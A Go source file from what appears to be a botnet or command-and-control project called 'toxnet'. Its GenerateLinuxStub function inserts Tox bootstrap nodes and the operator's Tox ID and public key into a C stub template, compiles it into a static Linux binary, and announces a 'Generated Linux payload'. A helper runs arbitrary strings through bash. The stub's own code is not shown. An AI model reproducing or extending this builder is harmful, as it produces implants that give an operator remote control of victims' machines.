package net

import (
	"bytes"
	"fmt"
	"io/ioutil"
	"os"
	"os/exec"
	"strconv"
	"strings"

	"github.com/0x4meliorate/toxnet/payloads"
)

func Shellout(command string) (error, string, string) {
	var stdout bytes.Buffer
	var stderr bytes.Buffer
	cmd := exec.Command("/bin/bash", "-c", command)
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr
	err := cmd.Run()
	return err, stdout.String(), stderr.String()
}

var BootstrapStub string

func GenerateLinuxStub(outputFile string) {

	servers := GetBootstraps()
	var bootstraps []string
	for _, server := range servers.Nodes {
		if server.StatusTCP == true || server.StatusUDP == true {
			bootstraps = append(bootstraps, "\t{\""+server.Ipv4+"\","+strconv.FormatInt(int64(server.Port), 10)+",\""+server.PublicKey+"\"}")
		}
	}

	stub := payloads.Linux_stub
	stub = strings.Replace(stub, "TOXNET_REPLACE_ME_BOOTSTRAPS", strings.Join(bootstraps[:], ",\n"), -1)
	stub = strings.Replace(stub, "TOXNET_REPLACE_ME_TOX_ID", Tox_instance.SelfGetAddress(), -1)
	stub = strings.Replace(stub, "TOXNET_REPLACE_ME_PUB_KEY", Tox_instance.SelfGetPublicKey(), -1)

	err := ioutil.WriteFile("temp_linux_stub.c", []byte(stub), 0666)
	if err != nil {
		fmt.Println("[-] Error: Failed writing Linux stub -", err)
	}

	path, err := os.Getwd()
	if err != nil {
		fmt.Println(err)
	}

	err, stdout, stderr := Shellout("gcc -o " + outputFile + " temp_linux_stub.c -I tox/include -I deps/file2str -lpthread -Bstatic /usr/lib/x86_64-linux-gnu/libtoxcore.a /usr/lib/x86_64-linux-gnu/libsodium.a -lrt -Bdynamic -lc -lm -lgcc -ldl -pthread")
	if err != nil {
		fmt.Println("[-] Error: Failed compiling Linux stub -", err)
	}

	fmt.Println(stdout, stderr)
	fmt.Println("[+] Generated Linux payload:", path+"/"+outputFile)

	err = os.Remove("temp_linux_stub.c")
	if err != nil {
		fmt.Println("[-] Error: Failed removing "+path+"/temp_linux_stub.c -", err)
	}
	fmt.Println("[+] Successfully removed: temp_linux_stub.c")
}
